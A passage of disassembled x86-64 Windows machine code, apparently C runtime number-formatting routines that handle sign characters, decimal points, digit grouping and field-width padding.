   140004715:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140004719:	db 6d d0             	fldt   -0x30(%rbp)
   14000471c:	db 7d c0             	fstpt  -0x40(%rbp)
   14000471f:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140004723:	48 89 c1             	mov    %rax,%rcx
   140004726:	e8 84 ff ff ff       	call   0x1400046af
   14000472b:	db 6d d0             	fldt   -0x30(%rbp)
   14000472e:	db 7d c0             	fstpt  -0x40(%rbp)
   140004731:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140004735:	48 89 c1             	mov    %rax,%rcx
   140004738:	e8 83 4e 00 00       	call   0x1400095c0
   14000473d:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140004740:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140004743:	25 00 01 00 00       	and    $0x100,%eax
   140004748:	85 c0                	test   %eax,%eax
   14000474a:	74 1d                	je     0x140004769
   14000474c:	8b 45 f8             	mov    -0x8(%rbp),%eax
   14000474f:	25 00 04 00 00       	and    $0x400,%eax
   140004754:	85 c0                	test   %eax,%eax
   140004756:	74 07                	je     0x14000475f
   140004758:	b8 03 00 00 00       	mov    $0x3,%eax
   14000475d:	eb 05                	jmp    0x140004764
   14000475f:	b8 04 00 00 00       	mov    $0x4,%eax
   140004764:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140004767:	eb 4a                	jmp    0x1400047b3
   140004769:	8b 45 f8             	mov    -0x8(%rbp),%eax
   14000476c:	25 00 04 00 00       	and    $0x400,%eax
   140004771:	85 c0                	test   %eax,%eax
   140004773:	74 37                	je     0x1400047ac
   140004775:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140004778:	25 00 40 00 00       	and    $0x4000,%eax
   14000477d:	85 c0                	test   %eax,%eax
   14000477f:	74 10                	je     0x140004791
   140004781:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%rbp)
   140004788:	c7 45 fc c3 bf ff ff 	movl   $0xffffbfc3,-0x4(%rbp)
   14000478f:	eb 22                	jmp    0x1400047b3
   140004791:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
   140004798:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   14000479c:	98                   	cwtl
   14000479d:	25 ff 7f 00 00       	and    $0x7fff,%eax
   1400047a2:	2d 3e 40 00 00       	sub    $0x403e,%eax
   1400047a7:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400047aa:	eb 07                	jmp    0x1400047b3
   1400047ac:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   1400047b3:	8b 45 f8             	mov    -0x8(%rbp),%eax
   1400047b6:	83 f8 04             	cmp    $0x4,%eax
   1400047b9:	74 0e                	je     0x1400047c9
   1400047bb:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   1400047bf:	98                   	cwtl
   1400047c0:	25 00 80 00 00       	and    $0x8000,%eax
   1400047c5:	89 c2                	mov    %eax,%edx
   1400047c7:	eb 05                	jmp    0x1400047ce
   1400047c9:	ba 00 00 00 00       	mov    $0x0,%edx
   1400047ce:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1400047d2:	89 10                	mov    %edx,(%rax)
   1400047d4:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400047d7:	4c 8d 4d f8          	lea    -0x8(%rbp),%r9
   1400047db:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400047df:	48 8d 0d 8a 68 00 00 	lea    0x688a(%rip),%rcx        # 0x14000b070
   1400047e6:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400047ea:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400047ef:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   1400047f3:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   1400047f8:	8b 55 30             	mov    0x30(%rbp),%edx
   1400047fb:	89 54 24 28          	mov    %edx,0x28(%rsp)
   1400047ff:	8b 55 20             	mov    0x20(%rbp),%edx
   140004802:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140004806:	89 c2                	mov    %eax,%edx
   140004808:	e8 7d 24 00 00       	call   0x140006c8a
   14000480d:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140004814:	5b                   	pop    %rbx
   140004815:	5d                   	pop    %rbp
   140004816:	c3                   	ret
   140004817:	55                   	push   %rbp
   140004818:	53                   	push   %rbx
   140004819:	48 83 ec 58          	sub    $0x58,%rsp
   14000481d:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140004822:	48 89 cb             	mov    %rcx,%rbx
   140004825:	db 2b                	fldt   (%rbx)
   140004827:	db 7d f0             	fstpt  -0x10(%rbp)
   14000482a:	89 55 28             	mov    %edx,0x28(%rbp)
   14000482d:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140004831:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140004835:	db 6d f0             	fldt   -0x10(%rbp)
   140004838:	db 7d e0             	fstpt  -0x20(%rbp)
   14000483b:	4c 8b 45 30          	mov    0x30(%rbp),%r8
   14000483f:	8b 4d 28             	mov    0x28(%rbp),%ecx
   140004842:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140004846:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   14000484a:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000484f:	4d 89 c1             	mov    %r8,%r9
   140004852:	41 89 c8             	mov    %ecx,%r8d
   140004855:	48 89 c2             	mov    %rax,%rdx
   140004858:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000485d:	e8 88 fe ff ff       	call   0x1400046ea
   140004862:	48 83 c4 58          	add    $0x58,%rsp
   140004866:	5b                   	pop    %rbx
   140004867:	5d                   	pop    %rbp
   140004868:	c3                   	ret
   140004869:	55                   	push   %rbp
   14000486a:	53                   	push   %rbx
   14000486b:	48 83 ec 58          	sub    $0x58,%rsp
   14000486f:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140004874:	48 89 cb             	mov    %rcx,%rbx
   140004877:	db 2b                	fldt   (%rbx)
   140004879:	db 7d f0             	fstpt  -0x10(%rbp)
   14000487c:	89 55 28             	mov    %edx,0x28(%rbp)
   14000487f:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140004883:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140004887:	db 6d f0             	fldt   -0x10(%rbp)
   14000488a:	db 7d e0             	fstpt  -0x20(%rbp)
   14000488d:	4c 8b 45 30          	mov    0x30(%rbp),%r8
   140004891:	8b 4d 28             	mov    0x28(%rbp),%ecx
   140004894:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140004898:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   14000489c:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400048a1:	4d 89 c1             	mov    %r8,%r9
   1400048a4:	41 89 c8             	mov    %ecx,%r8d
   1400048a7:	48 89 c2             	mov    %rax,%rdx
   1400048aa:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400048af:	e8 36 fe ff ff       	call   0x1400046ea
   1400048b4:	48 83 c4 58          	add    $0x58,%rsp
   1400048b8:	5b                   	pop    %rbx
   1400048b9:	5d                   	pop    %rbp
   1400048ba:	c3                   	ret
   1400048bb:	55                   	push   %rbp
   1400048bc:	53                   	push   %rbx
   1400048bd:	48 83 ec 68          	sub    $0x68,%rsp
   1400048c1:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
   1400048c6:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   1400048ca:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400048ce:	8b 40 14             	mov    0x14(%rax),%eax
   1400048d1:	83 f8 fd             	cmp    $0xfffffffd,%eax
   1400048d4:	75 57                	jne    0x14000492d
   1400048d6:	48 8d 45 cc          	lea    -0x34(%rbp),%rax
   1400048da:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400048e0:	ba 00 00 00 00       	mov    $0x0,%edx
   1400048e5:	48 89 c1             	mov    %rax,%rcx
   1400048e8:	e8 13 58 00 00       	call   0x14000a100
   1400048ed:	e8 f6 57 00 00       	call   0x14000a0e8
   1400048f2:	48 8b 10             	mov    (%rax),%rdx
   1400048f5:	48 8d 4d cc          	lea    -0x34(%rbp),%rcx
   1400048f9:	48 8d 45 d6          	lea    -0x2a(%rbp),%rax
   1400048fd:	49 89 c9             	mov    %rcx,%r9
   140004900:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140004906:	48 89 c1             	mov    %rax,%rcx
   140004909:	e8 c0 54 00 00       	call   0x140009dce
   14000490e:	89 45 ec             	mov    %eax,-0x14(%rbp)
   140004911:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
   140004915:	7e 0c                	jle    0x140004923
   140004917:	0f b7 55 d6          	movzwl -0x2a(%rbp),%edx
   14000491b:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000491f:	66 89 50 18          	mov    %dx,0x18(%rax)
   140004923:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004927:	8b 55 ec             	mov    -0x14(%rbp),%edx
   14000492a:	89 50 14             	mov    %edx,0x14(%rax)
   14000492d:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004931:	0f b7 40 18          	movzwl 0x18(%rax),%eax
   140004935:	66 85 c0             	test   %ax,%ax
   140004938:	0f 84 c7 00 00 00    	je     0x140004a05
   14000493e:	48 89 e0             	mov    %rsp,%rax
   140004941:	48 89 c3             	mov    %rax,%rbx
   140004944:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004948:	8b 40 14             	mov    0x14(%rax),%eax
   14000494b:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000494e:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140004951:	48 63 d0             	movslq %eax,%rdx
   140004954:	48 83 ea 01          	sub    $0x1,%rdx
   140004958:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
   14000495c:	48 98                	cltq
   14000495e:	48 83 c0 0f          	add    $0xf,%rax
   140004962:	48 c1 e8 04          	shr    $0x4,%rax
   140004966:	48 c1 e0 04          	shl    $0x4,%rax
   14000496a:	e8 d1 f0 ff ff       	call   0x140003a40
   14000496f:	48 29 c4             	sub    %rax,%rsp
   140004972:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140004977:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   14000497b:	48 8d 45 c4          	lea    -0x3c(%rbp),%rax
   14000497f:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140004985:	ba 00 00 00 00       	mov    $0x0,%edx
   14000498a:	48 89 c1             	mov    %rax,%rcx
   14000498d:	e8 6e 57 00 00       	call   0x14000a100
   140004992:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004996:	0f b7 40 18          	movzwl 0x18(%rax),%eax
   14000499a:	0f b7 d0             	movzwl %ax,%edx
   14000499d:	48 8d 4d c4          	lea    -0x3c(%rbp),%rcx
   1400049a1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400049a5:	49 89 c8             	mov    %rcx,%r8
   1400049a8:	48 89 c1             	mov    %rax,%rcx
   1400049ab:	e8 80 50 00 00       	call   0x140009a30
   1400049b0:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400049b3:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400049b7:	7e 36                	jle    0x1400049ef
   1400049b9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400049bd:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400049c1:	eb 1d                	jmp    0x1400049e0
   1400049c3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400049c7:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400049cb:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   1400049cf:	0f b6 00             	movzbl (%rax),%eax
   1400049d2:	0f be c0             	movsbl %al,%eax
   1400049d5:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   1400049d9:	89 c1                	mov    %eax,%ecx
   1400049db:	e8 b0 f1 ff ff       	call   0x140003b90
   1400049e0:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400049e3:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400049e6:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1400049e9:	85 c0                	test   %eax,%eax
   1400049eb:	7f d6                	jg     0x1400049c3
   1400049ed:	eb 11                	jmp    0x140004a00
   1400049ef:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400049f3:	48 89 c2             	mov    %rax,%rdx
   1400049f6:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   1400049fb:	e8 90 f1 ff ff       	call   0x140003b90
   140004a00:	48 89 dc             	mov    %rbx,%rsp
   140004a03:	eb 11                	jmp    0x140004a16
   140004a05:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004a09:	48 89 c2             	mov    %rax,%rdx
   140004a0c:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   140004a11:	e8 7a f1 ff ff       	call   0x140003b90
   140004a16:	90                   	nop
   140004a17:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140004a1b:	5b                   	pop    %rbx
   140004a1c:	5d                   	pop    %rbp
   140004a1d:	c3                   	ret
   140004a1e:	55                   	push   %rbp
   140004a1f:	48 89 e5             	mov    %rsp,%rbp
   140004a22:	48 83 ec 30          	sub    $0x30,%rsp
   140004a26:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140004a29:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004a2d:	83 7d 10 2e          	cmpl   $0x2e,0x10(%rbp)
   140004a31:	75 0e                	jne    0x140004a41
   140004a33:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004a37:	48 89 c1             	mov    %rax,%rcx
   140004a3a:	e8 7c fe ff ff       	call   0x1400048bb
   140004a3f:	eb 43                	jmp    0x140004a84
   140004a41:	83 7d 10 2c          	cmpl   $0x2c,0x10(%rbp)
   140004a45:	75 2f                	jne    0x140004a76
   140004a47:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004a4b:	0f b7 40 20          	movzwl 0x20(%rax),%eax
   140004a4f:	66 89 45 fe          	mov    %ax,-0x2(%rbp)
   140004a53:	0f b7 45 fe          	movzwl -0x2(%rbp),%eax
   140004a57:	66 85 c0             	test   %ax,%ax
   140004a5a:	74 28                	je     0x140004a84
   140004a5c:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140004a60:	48 8d 45 fe          	lea    -0x2(%rbp),%rax
   140004a64:	49 89 d0             	mov    %rdx,%r8
   140004a67:	ba 01 00 00 00       	mov    $0x1,%edx
   140004a6c:	48 89 c1             	mov    %rax,%rcx
   140004a6f:	e8 25 f3 ff ff       	call   0x140003d99
   140004a74:	eb 0e                	jmp    0x140004a84
   140004a76:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140004a7a:	8b 45 10             	mov    0x10(%rbp),%eax
   140004a7d:	89 c1                	mov    %eax,%ecx
   140004a7f:	e8 0c f1 ff ff       	call   0x140003b90
   140004a84:	90                   	nop
   140004a85:	48 83 c4 30          	add    $0x30,%rsp
   140004a89:	5d                   	pop    %rbp
   140004a8a:	c3                   	ret
   140004a8b:	55                   	push   %rbp
   140004a8c:	48 89 e5             	mov    %rsp,%rbp
   140004a8f:	48 83 ec 40          	sub    $0x40,%rsp
   140004a93:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140004a96:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004a9a:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140004a9e:	48 8d 45 ec          	lea    -0x14(%rbp),%rax
   140004aa2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004aa6:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004aaa:	c7 40 10 ff ff ff ff 	movl   $0xffffffff,0x10(%rax)
   140004ab1:	83 7d 10 00          	cmpl   $0x0,0x10(%rbp)
   140004ab5:	74 11                	je     0x140004ac8
   140004ab7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004abb:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004abf:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004ac3:	c6 00 2d             	movb   $0x2d,(%rax)
   140004ac6:	eb 3e                	jmp    0x140004b06
   140004ac8:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004acc:	8b 40 08             	mov    0x8(%rax),%eax
   140004acf:	25 00 01 00 00       	and    $0x100,%eax
   140004ad4:	85 c0                	test   %eax,%eax
   140004ad6:	74 11                	je     0x140004ae9
   140004ad8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004adc:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004ae0:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004ae4:	c6 00 2b             	movb   $0x2b,(%rax)
   140004ae7:	eb 1d                	jmp    0x140004b06
   140004ae9:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004aed:	8b 40 08             	mov    0x8(%rax),%eax
   140004af0:	83 e0 40             	and    $0x40,%eax
   140004af3:	85 c0                	test   %eax,%eax
   140004af5:	74 0f                	je     0x140004b06
   140004af7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004afb:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004aff:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004b03:	c6 00 20             	movb   $0x20,(%rax)
   140004b06:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%rbp)
   140004b0d:	eb 38                	jmp    0x140004b47
   140004b0f:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004b13:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004b17:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004b1b:	0f b6 00             	movzbl (%rax),%eax
   140004b1e:	83 e0 df             	and    $0xffffffdf,%eax
   140004b21:	41 89 c0             	mov    %eax,%r8d
   140004b24:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004b28:	8b 40 08             	mov    0x8(%rax),%eax
   140004b2b:	83 e0 20             	and    $0x20,%eax
   140004b2e:	89 c1                	mov    %eax,%ecx
   140004b30:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004b34:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004b38:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004b3c:	44 89 c2             	mov    %r8d,%edx
   140004b3f:	09 ca                	or     %ecx,%edx
   140004b41:	88 10                	mov    %dl,(%rax)
   140004b43:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
   140004b47:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140004b4b:	7f c2                	jg     0x140004b0f
   140004b4d:	48 8d 45 ec          	lea    -0x14(%rbp),%rax
   140004b51:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140004b55:	48 29 c2             	sub    %rax,%rdx
   140004b58:	89 d1                	mov    %edx,%ecx
   140004b5a:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140004b5e:	48 8d 45 ec          	lea    -0x14(%rbp),%rax
   140004b62:	49 89 d0             	mov    %rdx,%r8
   140004b65:	89 ca                	mov    %ecx,%edx
   140004b67:	48 89 c1             	mov    %rax,%rcx
   140004b6a:	e8 a5 f0 ff ff       	call   0x140003c14
   140004b6f:	90                   	nop
   140004b70:	48 83 c4 40          	add    $0x40,%rsp
   140004b74:	5d                   	pop    %rbp
   140004b75:	c3                   	ret
   140004b76:	55                   	push   %rbp
   140004b77:	48 89 e5             	mov    %rsp,%rbp
   140004b7a:	48 83 ec 30          	sub    $0x30,%rsp
   140004b7e:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140004b81:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004b85:	44 89 45 20          	mov    %r8d,0x20(%rbp)
   140004b89:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   140004b8d:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004b91:	7e 2e                	jle    0x140004bc1
   140004b93:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004b97:	8b 40 0c             	mov    0xc(%rax),%eax
   140004b9a:	39 45 20             	cmp    %eax,0x20(%rbp)
   140004b9d:	7f 15                	jg     0x140004bb4
   140004b9f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ba3:	8b 40 0c             	mov    0xc(%rax),%eax
   140004ba6:	2b 45 20             	sub    0x20(%rbp),%eax
   140004ba9:	89 c2                	mov    %eax,%edx
   140004bab:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004baf:	89 50 0c             	mov    %edx,0xc(%rax)
   140004bb2:	eb 29                	jmp    0x140004bdd
   140004bb4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bb8:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   140004bbf:	eb 1c                	jmp    0x140004bdd
   140004bc1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bc5:	8b 40 0c             	mov    0xc(%rax),%eax
   140004bc8:	85 c0                	test   %eax,%eax
   140004bca:	7e 11                	jle    0x140004bdd
   140004bcc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bd0:	8b 40 0c             	mov    0xc(%rax),%eax
   140004bd3:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004bd6:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bda:	89 50 0c             	mov    %edx,0xc(%rax)
   140004bdd:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004be1:	8b 40 0c             	mov    0xc(%rax),%eax
   140004be4:	85 c0                	test   %eax,%eax
   140004be6:	78 2b                	js     0x140004c13
   140004be8:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bec:	8b 50 0c             	mov    0xc(%rax),%edx
   140004bef:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bf3:	8b 40 10             	mov    0x10(%rax),%eax
   140004bf6:	39 c2                	cmp    %eax,%edx
   140004bf8:	7e 19                	jle    0x140004c13
   140004bfa:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bfe:	8b 50 0c             	mov    0xc(%rax),%edx
   140004c01:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c05:	8b 40 10             	mov    0x10(%rax),%eax
   140004c08:	29 c2                	sub    %eax,%edx
   140004c0a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c0e:	89 50 0c             	mov    %edx,0xc(%rax)
   140004c11:	eb 0b                	jmp    0x140004c1e
   140004c13:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c17:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   140004c1e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c22:	8b 40 0c             	mov    0xc(%rax),%eax
   140004c25:	85 c0                	test   %eax,%eax
   140004c27:	7e 2c                	jle    0x140004c55
   140004c29:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c2d:	8b 40 10             	mov    0x10(%rax),%eax
   140004c30:	85 c0                	test   %eax,%eax
   140004c32:	7f 10                	jg     0x140004c44
   140004c34:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c38:	8b 40 08             	mov    0x8(%rax),%eax
   140004c3b:	25 00 08 00 00       	and    $0x800,%eax
   140004c40:	85 c0                	test   %eax,%eax
   140004c42:	74 11                	je     0x140004c55
   140004c44:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c48:	8b 40 0c             	mov    0xc(%rax),%eax
   140004c4b:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004c4e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c52:	89 50 0c             	mov    %edx,0xc(%rax)
   140004c55:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004c59:	7e 64                	jle    0x140004cbf
   140004c5b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c5f:	8b 40 08             	mov    0x8(%rax),%eax
   140004c62:	25 00 10 00 00       	and    $0x1000,%eax
   140004c67:	85 c0                	test   %eax,%eax
   140004c69:	74 54                	je     0x140004cbf
   140004c6b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c6f:	0f b7 40 20          	movzwl 0x20(%rax),%eax
   140004c73:	66 85 c0             	test   %ax,%ax
   140004c76:	74 47                	je     0x140004cbf
   140004c78:	8b 45 20             	mov    0x20(%rbp),%eax
   140004c7b:	83 c0 02             	add    $0x2,%eax
   140004c7e:	48 63 d0             	movslq %eax,%rdx
   140004c81:	48 69 d2 56 55 55 55 	imul   $0x55555556,%rdx,%rdx
   140004c88:	48 c1 ea 20          	shr    $0x20,%rdx
   140004c8c:	c1 f8 1f             	sar    $0x1f,%eax
   140004c8f:	29 c2                	sub    %eax,%edx
   140004c91:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140004c94:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140004c97:	eb 15                	jmp    0x140004cae
   140004c99:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
   140004c9d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ca1:	8b 40 0c             	mov    0xc(%rax),%eax
   140004ca4:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004ca7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cab:	89 50 0c             	mov    %edx,0xc(%rax)
   140004cae:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140004cb2:	7e 0b                	jle    0x140004cbf
   140004cb4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cb8:	8b 40 0c             	mov    0xc(%rax),%eax
   140004cbb:	85 c0                	test   %eax,%eax
   140004cbd:	7f da                	jg     0x140004c99
   140004cbf:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cc3:	8b 40 0c             	mov    0xc(%rax),%eax
   140004cc6:	85 c0                	test   %eax,%eax
   140004cc8:	7e 27                	jle    0x140004cf1
   140004cca:	83 7d 10 00          	cmpl   $0x0,0x10(%rbp)
   140004cce:	75 10                	jne    0x140004ce0
   140004cd0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cd4:	8b 40 08             	mov    0x8(%rax),%eax
   140004cd7:	25 c0 01 00 00       	and    $0x1c0,%eax
   140004cdc:	85 c0                	test   %eax,%eax
   140004cde:	74 11                	je     0x140004cf1
   140004ce0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ce4:	8b 40 0c             	mov    0xc(%rax),%eax
   140004ce7:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004cea:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cee:	89 50 0c             	mov    %edx,0xc(%rax)
   140004cf1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cf5:	8b 40 0c             	mov    0xc(%rax),%eax
   140004cf8:	85 c0                	test   %eax,%eax
   140004cfa:	7e 38                	jle    0x140004d34
   140004cfc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d00:	8b 40 08             	mov    0x8(%rax),%eax
   140004d03:	25 00 06 00 00       	and    $0x600,%eax
   140004d08:	85 c0                	test   %eax,%eax
   140004d0a:	75 28                	jne    0x140004d34
   140004d0c:	eb 11                	jmp    0x140004d1f
   140004d0e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d12:	48 89 c2             	mov    %rax,%rdx
   140004d15:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004d1a:	e8 71 ee ff ff       	call   0x140003b90
   140004d1f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d23:	8b 40 0c             	mov    0xc(%rax),%eax
   140004d26:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140004d29:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140004d2d:	89 4a 0c             	mov    %ecx,0xc(%rdx)
